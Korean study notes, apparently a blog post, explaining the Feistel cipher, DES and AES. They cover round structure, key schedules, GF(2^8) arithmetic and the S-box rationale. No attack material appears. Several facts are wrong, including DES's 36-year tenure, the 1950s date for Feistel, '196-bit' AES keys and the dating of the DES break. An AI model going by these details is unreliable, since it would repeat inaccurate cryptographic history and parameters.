위 도식표는 feistel cipher를 표현한다. 64bits를 하나의 block으로 하고 16rounds를 갖는 feistel cipher는 다음과 같은 방식으로 동작한다.

1. input으로 암호화하고 싶은 plain text를 입력받는다.
1. K라는 매개변수를 전달받는다
   1. K는 48bits이다.
   1. key schedule이라는 방식을 사용하여 16개의 K를 만든다. 
1. 입력받은 64bits의 input text를 32bits씩 두개로 나누어 순서대로 LE, RE로 구분한다.
   1. RE는 두번 사용되는데 우선 첫번째로는 다음 Round에서 LE로 substitute된다.
   1. 두번째로 RE는 암호화 함수(F)의 입력으로 사용된다.
    <img src="https://user-images.githubusercontent.com/44011462/95155465-2bd5f900-07cf-11eb-8bf4-b4c619af4722.png" width=150px> 
   1. K와 RE를 입력으로 하여 함수(F)를 통해 나온 값은 LE와 XOR연산을 거쳐 다음단계의 RE로 사용된다.
1. 위의 3과정을 16번 반복한다. 
1. 16단계가 끝나면 LE와 RE를 전치(permute)한다.
2. feistel cipher을 이용한 암호화가 마무리되어 cipher text를 얻는다.

feistel cipher의 복호화는 다른 암호방식의 복호화와는 다른 특징이 있다. 기존의 방식은 암호화를 한 순서를 그대로 역행하여 복호화를 완성한다. feistel cipher는 비트연산이 2번 XOR되면 원래의 값이 그대로 나오는 특징을 이용하기 때문에 암호화의 순서대로 그대로 cipher text를 넣으면 plain text를 찾을 수 있다는 특징이 있다. 단, K값으로는 처음 암호화를 위해 key schedule을 하여 얻은 K1, K2, ..., K16을 복호화때는 거꾸로 K16, K15, ..., K1의 순서대로 사용해야 한다. 

이 암호체계는 1950년대에 개발되어 사용되었다. 그 당시의 시기를 이해해보면 개인용 컴퓨터가 흔하지 않았고 컴퓨터는 대부분 메인 프레임이었다. 따라서 계산하는데 비용이 매우 컸고, 용량을 차지하는 것에도 비용이 상당했다. 따라서 암화와 복호화가 하나의 방식으로 동작하는 feistel cipher는 시대적으로 매우 적절하고 유용한 방식이었다. 하나의 방식으로 동작할 수 있다는 의미는 함수(F)가 역연산이 가능하도록 고려할 필요가 없다는 의미이다. 함수(F)는 다음과 같이 설계되어있다.
<img src="https://user-images.githubusercontent.com/44011462/95156984-cc79e800-07d2-11eb-8a07-04fba4a72708.png" width=300px>    

함수(F)는 다음과 같이 동작한다.
1. 함수(F)에 입력으로 들어올 32bits RE를 48bits로 만들기 위해 특정 16bits를 두번 사용하여 48bits를 만든다(expansion)
2. K와 expansion을 XOR연산을 진행한다.
3. 2번의 결과인 48bits를 32bits로 바꾸주는 연산을 한다(substitution)
4. 3번의 결과인 32bits를 이리저리 위치를 바꾸어서 새로운 32bits를 만든다(permutation)


## the data encryption standard(DES)
1977년 미국의 National Bureau of Standards(지금의 NIST)에서 Federal Infomation Processing Standard 46의 일환으로 만들어진 표준화된 block cipher 체계가 DES이다. DES는 Data Encryption Algorithm(DEA)를 사용하는 국제 표준의 이름이며, DEA는 64bits의 Key를 이용하여 block cipher를 하는 암호화 체계이다. 2001년에 Advanced Encrpyion Standard(AES)라는 새로운 표준이 만들어지기 전 약 36년 동안 국제표준으로 이용되었고, 현재에도 상당히 많은 부분에서 DES를 사용하고 있다. 

### encryption and decryption
<img src="https://user-images.githubusercontent.com/44011462/95157803-08ae4800-07d5-11eb-9591-ecaa818115f7.png" width=300px> 

64bits의 Key는 7+1bits가 8개 묶음이 있는 형태이며, 마지막 1bit는 parity bit로 사용되어 실제로 암호화에 이용되는 key는 56bits이다. 앞서 살펴본 feistel cipher와 동일한 방식으로 동작한다. 암호화에 이용된 방식이 동일하에 복호화에도 이용되며 16round를 이용하여 암호화의 복잡도를 높였다. 

### strength of DES
국제적인 표준으로 정해져있어서 누구라도 암호화의 방식을 알 수 있다. 하지만 key에 따라서 <img src="https://user-images.githubusercontent.com/44011462/95157982-73f81a00-07d5-11eb-9441-542473332e75.png" height=20px> 가지의 경우의 수를 갖기 때문에 충분히 보안적으로 믿을 만하다. 만약 어떤 공격자가 특정 plain text가 어떤 cipher text로 바뀌는지 알고 있다고 가정하자. 만약 사용된 key가 어떤건지 알 수 있다면 앞으로 동일한 key를 사용하는 cipher text를 모두 해독할 수 있을 것이다. 위해서 frute force를 시도하여 key를 알아낸다고 하자. 1초에 대략 <img src="https://user-images.githubusercontent.com/44011462/95158083-b28dd480-07d5-11eb-96e2-51c80efe2cda.png" height=20px>번의 decryption 연산이 가능한 기계를 사용한다면 최대 1년 1개월 2주가 소요된다.   
하지만 2000년대 초반에 DES의 취약점이 있다는 것을 인지한 몇몇 사람들이 DES를 해독하는 슈퍼 컴퓨터를 만들었다. 실제로 24시간만에 DES에 사용된 key를 알아냈다. 그 사건을 계기로 AES가 만들어지게 되었고, 128bits key를 이용하는 AES-128을 1초에 대략 <img src="https://user-images.githubusercontent.com/44011462/95158083-b28dd480-07d5-11eb-96e2-51c80efe2cda.png" height=20px>번의 decryption 연산이 가능한 기계를 사용한다면 <img src="https://user-images.githubusercontent.com/44011462/95158584-e87f8880-07d6-11eb-83fc-9e2686501f83.png" height=20px>년이 걸린다. AES는 128bits, 192bits, 256bits의 방식이 존재한다.
한가지 주목할 점은 permutation cipher의 key는 <img src="https://user-images.githubusercontent.com/44011462/95153621-d0a20780-07ca-11eb-9333-9d431c3d2c86.png" height=20px>개의 경우의 수가 있고 이를 만약 1초에 대략 <img src="https://user-images.githubusercontent.com/44011462/95158083-b28dd480-07d5-11eb-96e2-51c80efe2cda.png" height=20px>번의 decryption 연산이 가능한 기계를 사용한다면 <img src="https://user-images.githubusercontent.com/44011462/95158744-57f57800-07d7-11eb-993e-370eac7b29ee.png" height=20px>년이 걸린다. 통계적인 취약점을 노리면 단시간에 해독할 수 있다는 한계가 있었다. 하지만 DES나 AES는 이러한 통계적인 방식이 전혀 통하지 않는 암호쳬계이며 따라서 모든 경우의 수를 전수조사하는 brute force 공격만이 유일한 공격방법이라는 점을 볼때 AES-128은 비교적 상당히 안전한 암호체계라고 할 수 있다. 



# AES(Advanced Encryption Standard)
AES는 'DES는 key의 길이다 짧다'는 한계를 극복하기 위해서 2001년에 NIST(National Institute of Standards and Technology)의해 채택된 표준이다. AES는 벨기에의 Rijmen과 Daemen이라는 두 암호학자가 만든 Rijndael이라는 암호화 알고리즘을 채택하여 표준화하여 완성하였다. [FIPS Publication 197](https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.197.pdf)로 등록되어 있다. 

## Why Finite Field for Block Cipher
block cipher는 128, 196, 256단위의 bit를 무작위로 섞어서 암호화하는 방식을 일컷는다. 덧셈이나 뺄셈은 강력한 무작위 효과를 내기 어렵다. bit에서의 modular 연산은 상쇄되는 효과가 있기 때문이다. 그렇다면 곱셉과 나눗셈은 어떨까. 매우 강력한 효과를 낼수 있고 이 모든 연산에 대해서 닫혀있는 field를 다뤄야 정해진 형태가 유지될 수 있기 떄문에 finite field를 사용하여 이러한 효과를 낸다.   
이러한 이유떄문에 finite field를 사용한다. 그렇다면 finite field중에서 어떤 field를 사용해야 하는가? 이중에서 원하는 데이터의 format에 정확히 맞게끔 bit를 다루기에는 2^n을 사용하는 것이 유리하다. 하지만 2^n은 field를 구성할 수 없는 합성수이다. 따라서 동일한 효과를 내기 위해서 계수가 2진수인 다항식(binary polynomials)로 표현하면 가능하다. 이중에서 AES는 GF(<img src="https://user-images.githubusercontent.com/44011462/95806027-b5db1000-0d41-11eb-92bf-312d78d992f6.png" height=20px>) bit가 8인 갈루아 필드를 사용한다. GF(<img src="https://user-images.githubusercontent.com/44011462/95806027-b5db1000-0d41-11eb-92bf-312d78d992f6.png" height=20px>)에서의 곱셉의 irreducible polynomial은 <img src="https://user-images.githubusercontent.com/44011462/95806122-ec188f80-0d41-11eb-87f5-7bcb90c8d9d5.png" height=25px>으로 하여 표준으로 정해져 있다. 참고로 modular 2의 polynomial에서는 <img src="https://user-images.githubusercontent.com/44011462/95806310-55000780-0d42-11eb-8f56-74d3771fb4df.png" height=25px>이 irreducible이 아니다. <img src="https://user-images.githubusercontent.com/44011462/95806368-72cd6c80-0d42-11eb-837c-d5f19dd9198e.png" height=25px>이기 떄문이다. 더불어  <img src="https://user-images.githubusercontent.com/44011462/95806443-a3ada180-0d42-11eb-81ae-378b443d93e6.png" height=25px>또한 성립한다. 이런 modular2의 polynomial을 고려하더라도 <img src="https://user-images.githubusercontent.com/44011462/95806122-ec188f80-0d41-11eb-87f5-7bcb90c8d9d5.png" height=25px>은 irreducible이고 표준으로 정해져있다. 

## General Structure
### State
4*4의 bytes로 구성된 행렬을 뜻한다. 이는 16bytes (=128bits)를 담고 있으며 plaintext, ciphertext, intermediate data를 표현하는데 사용한다. 
### Parameters Correspoding to the Key Size
key: 128, 196, and 256bits  
rounds: 10, 12, and 14
### SPN(Substitution-Permutation Network)
SPN은 암호화와 복호화의 방향성이 반대로 가는 것을 의미하는데, 이는 곧 연산의 역연산이 존재한다는 의미이기도 하다.
Round: for transformation functions
permutation: Shift Rows
substitution: subBytes / Mix Columns / Add Round Key

<img src="https://user-images.githubusercontent.com/44011462/95807374-fb4d0c80-0d44-11eb-9c12-a4464f5abd76.png" width=300px>


## Detailed Structure
AES는 전체적인 data block을 각 round마다 substitution과 permutation을 이용하여 암호화한다. AES는 SPN구조로 이루어지기 떄문에 Feistel과는 다르게 block전체가 모두 암호화가 된다.  

업데이트를 하는 과정에서 key가 사용되는데 32bits word가 4개가 모이면 128bit의 하나의 state가 되고 10rounds라면 11개가 필요하다. 11rounds의 key를 44개의 word로 표기하여 w[0], ..., w[43]으로 표기한다.  

각 10개의 rounds를 구성하는 연산이 4가지가 있다.
1. Substitute Bytes: bytes단위로 치환하는 것을 의미하며 정보는 S-Box에서 얻는다.
2. Shift Rows: 행 내부에서 rotation하는 연산이다.
3. Mix Columns: GF(2^8)에서 각각의 column을 update하는 연산이다.
4. Add Round Key: bitwisw XOR를 하는 연산이다.

전체 11번의 round의 시작과 끝은 Add Round Key가 사용된다.

각 state는 역연산을 지원하는 특징이 있기 때문에 encryption하는 연산과 decryption연산은 서로 다르다. Fiestel은 encryption과 decryption연산이 동일했다. 

<img src="https://user-images.githubusercontent.com/44011462/95808649-e625ad00-0d47-11eb-9ad6-6a64216f2bb3.png" width=300px>

## AES Transformation Function
<img src="https://user-images.githubusercontent.com/44011462/95812769-1160ca00-0d51-11eb-985e-abe802d54784.png" width=300px><img src="https://user-images.githubusercontent.com/44011462/95813071-f773b700-0d51-11eb-96a2-7d88648fe556.png" width=300px>  

하나의 round가 subBytes, shiftRows, mixColumns, addRoundKey의 4가지 연산으로 구성된다. 각각의 연산이 어떤일을 하는지는 아래에서 자세히 알아보자.

### Substitute Bytes
<img src="https://user-images.githubusercontent.com/44011462/95808842-559b9c80-0d48-11eb-92d1-5394840e935d.png" width=300px>  

<img src="https://user-images.githubusercontent.com/44011462/95809119-f8ecb180-0d48-11eb-827b-814878001ff9.png" width=300px>

### Rationale for S Box
Sbox는 암호학적 공격에 대해 안전하도록 설계되어 있다. 암호학적 공격에 대해 안전하다는 것은 통계적인 방법이나 brute force attack에 의한 공격에 대비가 되어있다는 의미이다. 또한 input과 output간의 linear mathematical관계를 찾기 어렵다는 의미이기도 하다. 이런 특성을 갖게 하는 방식이 multiplication inverse를 이용하는 방법이고 substitution box(S Box)는 이러한 특징을 잘 반영하고 있다. 이러한 특성이 안전성으로 이어지는 이유는 만약에 공격자가 plaintext와 ciphertext를 알게 된다고 하여도 암호화에 사용된 key를 알아내는것이 매우매우 어렵고 이는 <img src="https://user-images.githubusercontent.com/44011462/95810876-eeccb200-0d4c-11eb-8f55-d45b3268489b.png" height=25px>의 경우의 수를 살펴봐야 한다는 것을 의미한다. 만약 암호화에 이용된 방법이 선형적이라면(linear mathematical function) 수학적인 계산에 의한 방법으로 deterministic하게 알아 낼 수 있다.

<img src="https://user-images.githubusercontent.com/44011462/95810709-9ac1cd80-0d4c-11eb-84bf-a0544fbc611c.png" width=200px>


### Shift Rows
<img src="https://user-images.githubusercontent.com/44011462/95811352-107a6900-0d4e-11eb-91d3-835a6febf207.png" width=200px>

state는 plaintext, ciphertext, intermediatetext를 모두 표현하여 4행의 4열짜리 행렬로 다루게 된다. shift연산을 통해서 input이 output의 여러 부분에 분산하여 영향을 주도록 하여 input와 output의 연관관계를 복잡하게 형성하도록 만들어주는 역할을 한다. 

### Mix Columns
<img src="https://user-images.githubusercontent.com/44011462/95811387-21c37580-0d4e-11eb-95af-fc07e207e2e3.png" width=200px>

> Coefficients of a matrix based on a linear code with maximal distance between code words ensures a good mixing among the bytes of each column

간단히 축약하여 이야기하면 곱셈이 일어나는 과정에서 각각의 row에 있는 원소들이 모든 column에 영향을 주면서 결과적으로 input과 output간의 연관관계를 복잡하게 형성하도록 만들어주는 역할을 한다.

### Add Round Key
<img src="https://user-images.githubusercontent.com/44011462/95811352-107a6900-0d4e-11eb-91d3-835a6febf207.png" width=200px>

단순히 XOR하는 연산이다. 하지만 round key expansion의 과정을 거치면서 key의 부분이 cipher text의 전체에 영향을 주도록 하는 역할을 한다.

## AES Key Expansion
<img src="https://user-images.githubusercontent.com/44011462/95812769-1160ca00-0d51-11eb-985e-abe802d54784.png" width=300px>  

위에서 살펴본 그림을 다시 살펴보자. 각 round에서 과정을 일어나는 과정이 하는 역할을 구분해보면 누구라도 같은 결과를 얻게되는 constant input부분과 variable input부분을 나누어서 생각할 수 있다. constant input에서 하는 역할은 그 자체가 암호화의 과정이 아니라 암호화의 결과를 쉽게 유추할 수 없도록 input과 output의 상관관계를 복잡하게 만드는 역할을 한다. 따라서 실제로 plaintext를 ciphertext로 만드는데 중요한 역할을 하는 것은 round key이다. 

<img src="https://user-images.githubusercontent.com/44011462/95813071-f773b700-0d51-11eb-96a2-7d88648fe556.png" width=300px> 
위의 과정을 보면 한번의 round를 거쳐 나온 intermediate text가 다음 round에서 모든 bit에 영향을 주고 있다. 따라서 bit하나가 바뀐 결과가 다음에 모든 결과에 영향을 주기 때문에 공격자가 plain text와 cipher text를 알더라도 그 non-linear하지 않은 과정을 유추하기는 매우 어렵다.

### Key Expansion Algorithm
AES-128을 기준으로 key가 어떻게 생성되는지 확인해보자. 128bits는 10round를 실행하도록 설계되어 있고 마지막에 1개의 round를 추가로 활용하므로 입력받은 16bytes(4words)의 key가 11개의 rounds, 즉 44개의 words로 변환되는 과정을 살펴보자. 

<img src="https://user-images.githubusercontent.com/44011462/95814178-b7fa9a00-0d54-11eb-8aa7-f34ed453dc1e.png" width=300px> 

위에 그림에는 key가 들어와서 11개의 round를 만드는 과정이 나와있다. 매번 round를 만들어낼 때마다 g라는 암호화함수를 거친다. 그 결과를 Feistel cipher를 이용하여 다음 round를 구하고 그 결과를 다시 다음 round에 이용한다. 그렇다면 g함수에서는 무슨일을 할까? RC에는 10개의 polynomial with modular가 담겨있고 modular는 앞서 말한것 처럼 irreducible인 <img src="https://user-images.githubusercontent.com/44011462/95806122-ec188f80-0d41-11eb-87f5-7bcb90c8d9d5.png" height=25px>으로 정해져 있다. 위 도표의 흐름을 따라가면 round가 반복될때마다 key의 각 bit가 다음 round에서 활용하는 key의 모든 bit에 영향을 주도록 설계되어 있다. 따라서 입력으로 들어가는 key값이 무엇인지를 알아내는 것은 굉장히 어렵다.

### Rationale for Key Expansion

여러 round에 사용된 key중 일부를 알게 되어도 다른 key는 알기 매우 어렵게 되어 있다. 하지만 구현하는 측면에서는 매우 간단한 연산을 이용하므로 일반적인 cpu를 이용하여 충분히 구현가능하다. Diffusion(확산, 어느 한 bit의 변화가 모든 round에 확산되어 영향을 주는 것을 의미)이 발생하는 nonlinearity가 발생하여 plaintext와 ciphertext를 알아도 key를 알아내거나 방식을 유추하는 것은 매우 어렵다.

<img src="https://user-images.githubusercontent.com/44011462/95816172-66084300-0d59-11eb-8c34-3e5a7d6ff897.png" width=300px> 

key가 같을 때 128bits를 갖는 두개의 plaintext가 round가 지남에 따라 어떻게 다른가

<img src="https://user-images.githubusercontent.com/44011462/95816268-a5369400-0d59-11eb-99ce-8330a99ecc04.png" width=300px> 

key만 1bit가 다르고, 같은 128bits를 갖는 두개의 plaintext가 round가 지남에 따라 어떻게 다른가

암호학에서 가장 이상적인 것은 '임의성'이 보장되는 것이다. 위 예시를 보면 128bits를 암호화했을떄 절반정도가 서로다르고 나머지 절반정도는 비슷한 것을 볼 수 있다. 한 비트가 갖을 수 있는 경우의 수가 2개이므로 전체적으로 64개의 bits정도가 바뀌는 것이 가장 이상적이라고 볼수 있고 AES는 이러한 조건을 만족하는 형태의 암호체계이다.

AES는 구현적인 측면에서도 상당히 효율적인 암호체계이다. 우선 AES는 8bits를 기본단위로 한다. 따라서 8bits를 갖는 processor에서 상당히 효율적이다. 또한 구성 연산도 XOR, Shift, memory 참고 등의 cpu가 매우 잘하는 연산으로 구현가능하다. 8bits processor는 지금도 IoT장치에서 보편적으로 사용하는 프로세서이다. 그렇다면 일반적으로 32bits, 64bits architecture를 갖는 PC에서는 어떨까? 4kb의 용량을 사용하면 SubBytes, ShiftRows, MixColumns를 미리 계산해두고 단순히 memory 참조만으로 암호계를 사용할 수 있다. 따라서 32bits, 64bits 아키텍처를 갖는 PC에서도 굉장히 효율적으로 사용 할수 있는 암호체계이며, 이는 Rijndeal 알고리즘이 NIST의 표준으로 채택되는 데에 중요한 근거로 쓰였을 것으로 추축된다. 